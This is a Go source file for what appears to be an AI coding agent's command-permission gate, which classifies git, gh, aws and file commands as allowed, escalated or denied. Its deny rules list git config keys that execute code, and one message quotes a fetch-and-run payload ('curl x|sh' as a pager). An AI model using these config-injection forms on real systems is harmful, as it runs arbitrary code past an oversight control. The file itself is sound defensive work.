package main

import (
	"fmt"
	"strings"
)

// classifySimpleCommand applies the compiled rule set to one reduced command.
// Order of precedence:
//
//  1. A command we cannot statically pin (no program token) → ASK.
//  2. A command with a redirect to a real file → DEFER (the normal pipeline's
//     allow-list will not match it; we do not auto-allow exfiltration).
//  3. Program-specific DENY/ASK rules (git, gh, aws identity, etc.).
//  4. Program-specific ALLOW rules (read-only git/gh/aws/acli).
//  5. Path-bearing read/write programs → Engine B containment.
//  6. Otherwise DEFER to the normal pipeline.
func classifySimpleCommand(sc simpleCommand, ev *Event) Decision {
	if len(sc.args) == 0 {
		return ask("bash:no-program", "Blocked: could not determine the program for a command part; escalating to a human (fail-closed).")
	}

	prog := basename(sc.args[0])
	args := sc.args[1:]

	// A command with a command substitution or unresolved expansion in ANY
	// argument cannot be statically proven safe (#1). It must never ride the
	// allow track. DENY rules (identity writes, reset --hard, auth switch)
	// still apply — those match on fixed flag tokens, which are present
	// regardless of an expansion elsewhere — but the read-only ALLOW track is
	// disabled. We surface this by handing such commands to the allow-aware
	// classifiers, which check hasUnknownExpansion before allowing.

	switch prog {
	case "git":
		return classifyGit(args, sc, ev)
	case "gh":
		return classifyGh(args, sc, ev)
	case "aws":
		return classifyAws(args, sc)
	case "acli":
		return classifyAcli(args, sc)
	case "less", "more", "od", "xxd", "hexdump":
		// Read-class pagers / binary dumpers whose path arguments must stay
		// inside the repo (#148: do not read a sibling repo's node_modules to
		// verify APIs). Contained reads DEFER; only an escape denies/asks. These
		// are deliberately NOT in the read-only-utility ALLOW set (#31) — they
		// are interactive / binary-dump tools out of that issue's scope.
		return classifyPathReader(prog, args, sc, ev)
	}

	// #32: curated in-repo-write ALLOW track (cp/mv/mkdir/touch/sed -i/tee FILE).
	// A file-mutating program ALLOWs when every path operand it writes is
	// contained in the current worktree; an escaping operand denies (#127/#148).
	// Dual-mode programs (sed/tee) are ALSO in readOnlyUtilities: route to this
	// classifier only for the genuinely-mutating form (mutatesFn), and let the
	// read-only form fall through to the read-only-utility classifier below.
	// Pure writers (cp/mv/mkdir/touch — no mutatesFn) always route here.
	if spec, ok := inRepoWriters[prog]; ok {
		if spec.mutatesFn == nil || spec.mutatesFn(args, sc) {
			return classifyInRepoWrite(prog, args, sc, ev)
		}
	}

	// #31: curated read-only-utility ALLOW track (cat/head/sed -n/awk/printf/…).
	// The proven read-only form of these high-frequency text/data utilities
	// ALLOWs (no real-file redirect, no unknown expansion, no mutating flag,
	// path operands contained); everything else defers. cat/head/tail used to
	// route to classifyPathReader above (DEFER on contained); they now ALLOW the
	// read-only form here.
	if _, ok := readOnlyUtilities[prog]; ok {
		return classifyReadOnlyUtility(prog, args, sc, ev)
	}

	// No specific rule. The gate has no opinion; hand back to the pipeline.
	return deferToPipeline()
}

// preconditionDeny applies the #64 precondition shared by the git/gh/aws
// classifiers BEFORE any per-command logic: every word of the command must be a
// static literal (no command substitution / unresolved parameter expansion /
// glob), and there must be no inline environment-assignment prefix. Either
// shape can reach a dangerous outcome without the flags the policy keys on
// (`AWS_ENDPOINT_URL=… aws …` redirects egress; `git $OP` hides the
// subcommand), so a hit DENYs rather than allowing. Returns the deny Decision
// and true on a hit; the zero Decision and false otherwise.
//
// Per the #64 resolved design decisions, these classifiers never defer:
// callers must convert this into a concrete DENY here rather than handing a
// non-static command back to the pipeline.
func preconditionDeny(tool string, sc simpleCommand) (Decision, bool) {
	if sc.hasInlineAssignment {
		return deny(tool+" inline-env-assignment (#64)",
			"Blocked: an inline environment-assignment prefix on '"+tool+"' (e.g. "+
				"AWS_ENDPOINT_URL=…, GIT_SSH_COMMAND=…, GH_HOST=…, AWS_PAGER=…) can redirect egress, "+
				"swap identity, or inject a pager without touching the command's arguments. "+
				"Remove the inline assignment; if the variable is genuinely needed, surface it to the human."), true
	}
	if sc.hasUnknownExpansion {
		return deny(tool+" non-static-argv (#64)",
			"Blocked: a '"+tool+"' command whose arguments are not all static literals "+
				"(a command substitution, unresolved variable, or glob) cannot be statically classified and "+
				"could reach a dangerous operation through the dynamic token. Run the command with literal "+
				"arguments instead, so the gate can classify it."), true
	}
	return Decision{}, false
}

// classifyGit parses git's option grammar from the AST tokens: global options
// (`--no-pager`/`-P`, `-c k=v`, `-C path`, `--git-dir`, etc.) precede the
// subcommand (#13). Positional guessing is obsolete — we consume globals
// explicitly, then dispatch on the real subcommand.
//
// Per the #64 resolved design decisions this classifier NEVER defers: the
// catch-all for a recognized git subcommand is ALLOW (containment lives in the
// microVM), with the deny/ask tiers below carving out the dangerous shapes.
func classifyGit(args []string, sc simpleCommand, ev *Event) Decision {
	// #64 precondition: static argv + no inline env-assignment, gated FIRST.
	if d, hit := preconditionDeny("git", sc); hit {
		return d
	}

	// #64 bypass gate 3: `git -c …` / config-injection RCE. Scan the global
	// options screen BEFORE the subcommand is classified — these execute
	// arbitrary commands regardless of the subcommand.
	if d, hit := gitGlobalRCEDeny(args); hit {
		return d
	}

	sub, rest, cdir := parseGitGlobals(args)
	if sub == "" {
		// `git` with only globals / no subcommand — nothing dangerous and
		// nothing to run; ALLOW (the gate has no objection).
		return allow("git with no subcommand")
	}

	// If a `-C <path>` global was given, that path is the git context for
	// containment-relevant rules; otherwise the event cwd is used.
	_ = cdir // reserved for future per-path containment of `-C` targets

	// --- DENY rules ---

	// #125 (write half): identity writes.
	if sub == "config" {
		if d, hit := gitConfigIdentityRule(rest); hit {
			return d
		}
	}

	// #64 bypass gate 2 + push rules: classify `git push` on its refspec, not
	// just its flags. A `:`-bearing or empty-source refspec, --mirror/--prune,
	// and --force all reach delete/overwrite outcomes.
	if sub == "push" {
		return classifyGitPush(rest)
	}

	// #120: subagent `git reset --hard`.
	if sub == "reset" && containsToken(rest, "--hard") {
		if ev.isSubagent() {
			return deny("git reset --hard (subagent)",
				"Blocked: 'git reset --hard' in a subagent discards committed and working-tree state and is forbidden. "+
					"Remediation: do NOT reset; instead release the branch and re-derive from the remote tip with a "+
					"detached checkout of origin — e.g. 'git fetch origin <branch>' then 'git checkout --detach origin/<branch>' — "+
					"or 'git switch -c <branch> origin/<branch>'.")
		}
		// Main session: still destructive — escalate to a human rather than
		// auto-allow. (settings.json also lists this in its ask set.)
		return ask("git reset --hard",
			"'git reset --hard' discards committed and working-tree state. Confirm this is intended. "+
				"A safer alternative is a detached checkout of the origin tip — e.g. 'git fetch origin <branch>' "+
				"then 'git checkout --detach origin/<branch>'.")
	}

	// --- ALLOW default (#64): every recognized git subcommand that is not a
	// dangerous shape carved out above falls through to ALLOW. Read-only
	// subcommands and ordinary mutations (commit, add, fetch, …) alike are
	// allowed; containment lives in the microVM. A real-file redirect is the
	// one residual exfil concern the gate still escalates — it cannot defer
	// here (#64 decision 2), so it ASKs rather than auto-allowing.
	if sc.hasRedirectToFile {
		return ask("git redirect-to-file",
			"'git' with stdout/stderr redirected to a real file can exfiltrate or clobber. "+
				"Confirm the redirect target is intended.")
	}
	return allow(fmt.Sprintf("git %s is not a guarded dangerous operation", sub))
}

// gitGlobalRCEDeny scans git's pre-subcommand global-options screen for the
// config-injection / arbitrary-command-execution forms (#64 bypass gate 3):
// `-c <key>=<value>` whose key is a code-executing config knob (core.pager,
// core.sshCommand, core.fsmonitor, core.editor, alias.*, diff.external,
// *.textconv, *.command, sequence.editor, …), `--config-env`, and
// `--exec-path=<dir>`. Any hit DENYs. A bare `--exec-path` (no `=`, the query
// form that prints git's exec path) is left alone.
//
// Default-deny within the gate: an unrecognized `-c key=value` whose key COULD
// execute code is denied. We allow a conservative allowlist of inert display
// knobs (color.*, core.pager=cat is still denied because pager values run a
// shell) and deny the rest of `-c`, because the cost of a false deny is one
// human click while a false allow is arbitrary code execution (#64 principle 3).
func gitGlobalRCEDeny(args []string) (Decision, bool) {
	rceDeny := func() (Decision, bool) {
		return deny("git -c config-injection RCE (#64)",
			"Blocked: a 'git -c <key>=<value>' / '--config-env' / '--exec-path=<dir>' global option can execute "+
				"arbitrary commands (e.g. -c core.pager='curl x|sh', -c core.sshCommand=…, -c diff.external=…, "+
				"-c alias.*). These defeat any read-only classification. Run git without the config-injection global; "+
				"if a config value is genuinely needed, set it in the repo's own config deliberately, not inline."), true
	}
	for i := 0; i < len(args); i++ {
		a := args[i]
		// Stop scanning at the first non-option token (the subcommand) — git
		// globals only precede the subcommand.
		if !strings.HasPrefix(a, "-") {
			break
		}
		switch {
		case a == "-c":
			if i+1 < len(args) {
				if gitConfigKeyExecutesCode(args[i+1]) {
					return rceDeny()
				}
				i++ // consume the value
			}
		case strings.HasPrefix(a, "-c") && len(a) > 2:
			if gitConfigKeyExecutesCode(strings.TrimPrefix(a, "-c")) {
				return rceDeny()
			}
		case a == "--config-env" || strings.HasPrefix(a, "--config-env="):
			return rceDeny()
		case strings.HasPrefix(a, "--exec-path="):
			return rceDeny()
		}
	}
	return Decision{}, false
}

// gitConfigKeyExecutesCode reports whether a `-c key=value` config setting can
// execute an external command. Default-deny: a key whose VALUE is interpreted
// as (or names) a command is denied. The match is on the config key (the part
// before the first `=`), case-insensitively, and covers both exact keys and
// suffix patterns (`*.textconv`, `*.command`, `alias.*`).
func gitConfigKeyExecutesCode(kv string) bool {
	key := kv
	if eq := strings.IndexByte(kv, '='); eq >= 0 {
		key = kv[:eq]
	}
	key = strings.ToLower(key)
	// Exact code-executing keys.
	switch key {
	case "core.pager", "core.sshcommand", "core.fsmonitor", "core.editor",
		"core.hookspath", "sequence.editor", "diff.external", "gpg.program",
		"gpg.ssh.program", "pager.diff", "pager.log", "pager.show", "filter.lfs.process":
		return true
	}
	// Suffix / namespace patterns that name or run a command.
	if strings.HasPrefix(key, "alias.") ||
		strings.HasSuffix(key, ".textconv") ||
		strings.HasSuffix(key, ".command") ||
		strings.HasSuffix(key, ".process") ||
		strings.HasSuffix(key, ".smudge") ||
		strings.HasSuffix(key, ".clean") ||
		strings.HasPrefix(key, "pager.") ||
		strings.HasPrefix(key, "difftool.") ||
		strings.HasPrefix(key, "mergetool.") {
		return true
	}
	return false
}

// classifyGitPush classifies `git push` arguments (#64 bypass gate 2 + the push
// rules). rest is the args after the `push` subcommand token. The refspec — not
// just the flags — is classified: a refspec containing `:` (delete/overwrite)
// or whose source is empty (`:branch`, a delete) reaches a delete/overwrite
// outcome WITHOUT the `--delete` flag the naive policy keys on.
//
// DENY:  --mirror, --prune (delete every remote ref absent from local).
// ASK:   plain --force / -f (overwrites the ref).
// ALLOW: --force-with-lease (own-race protection), a clean named-branch delete
//
//	(--delete <branch> or origin :branch), tag deletion, and an
//	ordinary fast-forward push.
//
// Default within the gate: an arbitrary `:`-bearing refspec that is not a clean
// named-branch delete ASKs (it overwrites a remote ref). Never defers (#64).
func classifyGitPush(rest []string) Decision {
	// Collect flags and positional (non-flag) operands separately.
	var positionals []string
	hasForce := false
	hasForceWithLease := false
	for _, a := range rest {
		switch {
		case a == "--mirror":
			return deny("git push --mirror (#64)",
				"Blocked: 'git push --mirror' deletes every remote ref that is absent locally — "+
					"an irreparable bulk overwrite/delete of the remote. Push specific branches instead.")
		case a == "--prune":
			return deny("git push --prune (#64)",
				"Blocked: 'git push --prune' deletes every remote ref under the pushed refspec that is absent "+
					"locally. This can irreparably delete remote branches. Push specific branches without --prune.")
		case a == "--force" || a == "-f":
			hasForce = true
		case a == "--force-with-lease" || strings.HasPrefix(a, "--force-with-lease=") ||
			a == "--force-if-includes":
			hasForceWithLease = true
		case a == "--delete" || a == "-d":
			// A clean named-branch delete is recoverable (Restore-branch /
			// re-push) → ALLOW default; no special handling needed.
		case strings.HasPrefix(a, "-"):
			// Other flags (e.g. --tags, -u, --set-upstream, --no-verify) are not
			// dangerous shapes on their own; ignore for classification.
		default:
			positionals = append(positionals, a)
		}
	}

	// Refspec inspection: positionals are [remote] [refspec...]. A refspec
	// containing ':' is a source:dest mapping; an empty source ('') is a delete.
	for _, p := range positionals {
		colon := strings.IndexByte(p, ':')
		if colon < 0 {
			continue // a plain ref / remote name — not a colon-refspec.
		}
		src := p[:colon]
		if src == "" {
			// ':branch' — a delete of the destination ref. The Restore-branch
			// button / re-push recovers it, so a clean named-branch delete is
			// ALLOW per the spec, but a delete is still a remote mutation the
			// --delete-flag path treats as allow; keep it ALLOW here.
			continue
		}
		// 'src:dest' (or 'sha:branch') overwrites the destination ref WITHOUT a
		// --delete flag. This is the bypass §2 shape: route to ASK (overwrite),
		// unless it is the own-race-protected force-with-lease.
		if hasForceWithLease {
			continue
		}
		return ask("git push arbitrary-refspec (#64)",
			"'git push' with an explicit source:dest refspec (e.g. 'origin local:refs/heads/x', "+
				"'origin <sha>:branch') overwrites a remote ref without the --force flag the policy keys on. "+
				"Confirm this overwrite is intended; prefer --force-with-lease for race protection.")
	}

	if hasForce && !hasForceWithLease {
		return ask("git push --force (#64)",
			"'git push --force' overwrites the remote ref and, if nobody captured the prior SHA, degrades to "+
				"irreparable. Confirm this is intended. Prefer 'git push --force-with-lease' for race protection.")
	}

	// --force-with-lease, --delete <branch>, tag deletion, and an ordinary
	// fast-forward push are all recoverable / small units of work → ALLOW.
	return allow("git push (non-dangerous form)")
}

// parseGitGlobals consumes git's pre-subcommand global options and returns the
// subcommand, the remaining args, and the value of any `-C <path>` global.
func parseGitGlobals(args []string) (sub string, rest []string, cDir string) {
	i := 0
	for i < len(args) {
		a := args[i]
		switch {
		case a == "-C":
			if i+1 < len(args) {
				cDir = args[i+1]
				i += 2
			} else {
				i++
			}
		case strings.HasPrefix(a, "-C"):
			cDir = strings.TrimPrefix(a, "-C")
			i++
		case a == "-c":
			// `-c key=value` — skip the pair.
			i += 2
		case strings.HasPrefix(a, "-c") && len(a) > 2:
			i++
		case a == "--no-pager" || a == "-P" || a == "--paginate" || a == "--no-replace-objects" ||
			a == "--bare" || a == "--literal-pathspecs" || a == "--no-optional-locks" || a == "--exec-path":
			i++
		case a == "--git-dir" || a == "--work-tree" || a == "--namespace" || a == "--super-prefix":
			i += 2
		case strings.HasPrefix(a, "--git-dir=") || strings.HasPrefix(a, "--work-tree=") ||
			strings.HasPrefix(a, "--namespace=") || strings.HasPrefix(a, "--exec-path=") ||
			strings.HasPrefix(a, "--super-prefix="):
			i++
		case strings.HasPrefix(a, "-"):
			// Unknown global option: skip it conservatively.
			i++
		default:
			// First non-option token is the subcommand.
			return a, args[i+1:], cDir
		}
	}
	return "", nil, cDir
}

// gitConfigIdentityRule denies identity-mutating `git config` invocations
// (#125 write half) while leaving identity READS alone. `git config user.name X`,
// `git config user.email X`, `git config --global user.*`, writes routed through
// `--file <path>` setting a user.* key (e.g.
// `git config --file .git/config user.email X`), and explicit write verbs
// (`--add`/`--replace-all`/`--unset`/`--unset-all` on a user.* key) all DENY.
//
// The get form `git config user.email` — a `user.*` key with NO following value
// operand and no write verb — is a READ. It must defer (return false) so the
// normal pipeline's `git config:*` read allow governs it. This also resolves the
// `git -C <path> config --local user.email` false positive (#34): parseGitGlobals
// already consumes the `-C <path>` global before this rule sees `rest`, so the
// get-form gap was the sole cause of the #34 repro.
//
// The scan must look at ALL non-flag tokens, not just the first: a value-taking
// flag like `--file <path>` puts a non-flag token (the path) BEFORE the real
// key, so breaking on the first non-flag token would miss the `user.*` key.
// Flag values are skipped so a path argument is not mistaken for a config key.
func gitConfigIdentityRule(rest []string) (Decision, bool) {
	// A read form is not a mutation.
	for _, a := range rest {
		switch a {
		case "--get", "--get-all", "--get-regexp", "--list", "-l", "--get-urlmatch":
			return Decision{}, false
		}
	}
	// A write-verb flag turns ANY user.* key reference into a mutation, even
	// without a value operand (e.g. `git config --unset user.email`).
	hasWriteVerb := false
	for _, a := range rest {
		switch a {
		case "--add", "--replace-all", "--unset", "--unset-all":
			hasWriteVerb = true
		}
	}
	// Scan for a key token that targets user identity, tracking whether a
	// value operand follows it. Value-taking flags (`--file <path>`, `-f <path>`,
	// `--blob <ref>`) consume the following token so a path/ref is not misread as
	// the config key (or as the key's value).
	userKeySeen := false
	valueAfterKey := false
	for i := 0; i < len(rest); i++ {
		a := rest[i]
		if a == "--file" || a == "-f" || a == "--blob" {
			i++ // skip this flag's value
			continue
		}
		if strings.HasPrefix(a, "-") {
			continue // other flags (e.g. --global, --local, --file=<path>) carry no separate value token
		}
		// Non-flag operand. If we have already seen a user.* key, this operand
		// is its value → the write form.
		if userKeySeen {
			valueAfterKey = true
			break
		}
		key := strings.ToLower(a)
		if strings.HasPrefix(key, "user.") {
			userKeySeen = true
			continue
		}
		// A non-flag token that is not a user.* key is the config key being
		// operated on (e.g. `core.editor`). A `user.*` key, if present, would
		// match above; keep scanning in case a value-taking flag pushed the
		// user.* key later. A plain `git config core.x y` never sets userKeySeen,
		// so it falls through to "not an identity write".
	}
	if userKeySeen && (valueAfterKey || hasWriteVerb) {
		return deny("git config user.* (identity write)",
			"Blocked: writing git identity (user.name / user.email / user.signingkey) is forbidden — "+
				"it silently changes commit attribution. "+
				"The repo's committer identity is configured by the environment, not by ad-hoc 'git config' writes. "+
				"If you believe identity is genuinely misconfigured, surface it to the human rather than rewriting it."), true
	}
	// Either no user.* key, or a user.* key with no value and no write verb (a
	// read) → defer to the normal pipeline's read allow.
	return Decision{}, false
}

// basename returns the final path element of a program token, so an absolute
// or relative invocation (e.g. /usr/bin/git, ./git) classifies the same as a
// bare one.
func basename(p string) string {
	if i := strings.LastIndexByte(p, '/'); i >= 0 {
		return p[i+1:]
	}
	return p
}

func containsToken(args []string, tok string) bool {
	for _, a := range args {
		if a == tok {
			return true
		}
	}
	return false
}
